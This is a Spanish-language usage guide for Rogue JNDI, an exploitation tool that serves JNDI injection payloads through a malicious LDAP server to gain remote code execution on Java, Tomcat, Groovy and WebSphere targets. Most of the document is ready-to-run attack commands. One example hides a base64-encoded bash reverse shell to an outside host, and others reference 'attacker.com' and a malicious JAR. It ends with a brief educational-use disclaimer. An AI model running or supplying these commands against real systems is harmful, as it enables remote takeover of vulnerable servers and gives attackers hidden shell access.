# Rogue JNDI

Herramienta desarrollada por Veracode Research para realizar ataques de inyección JNDI (Java Naming and Directory Interface) que permiten ejecutar código remoto (RCE).

## Objetivo

Explotar vulnerabilidades en aplicaciones Java que utilizan JNDI de forma insegura. La herramienta actúa como un servidor LDAP malicioso que entrega payloads a través de:
- Remote classloading (hasta JDK 8u191)
- Inyección en BeanFactory de Tomcat
- Evaluación de Groovy
- XXE en WebSphere

## Características principales

| Tipo de ataque | Target | Método |
|----------------|--------|--------|
| RCE clásico | JDK ≤ 8u191 | Remote classloading |
| Tomcat RCE | Tomcat | BeanFactory + reflection |
| Groovy RCE | Aplicaciones Groovy | BeanFactory + GroovyShell |
| WebSphere XXE | WebSphere | ServiceFactory (OOB) |
| WebSphere RCE | WebSphere | ClientJ2CCFFactory |

## Uso

### Sintaxis básica

```bash
java -jar target/RogueJndi-1.0.jar [opciones]
```

### Opciones de línea de comandos

| Opción | Descripción |
|--------|-------------|
| `-c, --command` | Comando a ejecutar (default: calculator) |
| `-n, --hostname` | Hostname del servidor HTTP (requerido para remote classloading) |
| `-l, --ldapPort` | Puerto LDAP (default: 1389) |
| `-p, --httpPort` | Puerto HTTP (default: 8000) |
| `--wsdl` | Archivo WSDL con payload XXE (para websphere1) |
| `--localjar` | JAR local a cargar (para websphere2) |
| `-h, --help` | Mostrar ayuda |

## Ejemplos

### 1. RCE clásico con comando personalizado
```bash
java -jar target/RogueJndi-1.1.jar --command "nslookup your_dns_server.com" --hostname "192.168.1.10"
```

### 2. Ataque a Tomcat
```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xOjQ0NDQgMD4mMQ==}|{base64,-d}|{bash,-i}" --hostname "10.10.10.10"
```

### 3. Ataque WebSphere XXE
```bash
java -jar target/RogueJndi-1.1.jar --wsdl payload.wsdl --hostname "attacker.com"
```

### 4. Ataque WebSphere RCE
```bash
java -jar target/RogueJndi-1.1.jar --localjar malicious.jar --hostname "attacker.com"
```

### 5. Con puertos personalizados
```bash
java -jar target/RogueJndi-1.1.jar -c "/bin/bash -c whoami" -n 192.168.1.100 -l 1389 -p 8080
```

## Compilación

Requiere Java ≥ 1.7 y Maven ≥ 3:

```bash
sudo apt install maven -y
mvn package
```

## Disclaimer

Proporcionada únicamente con fines educativos y para pruebas de seguridad con permiso previo.
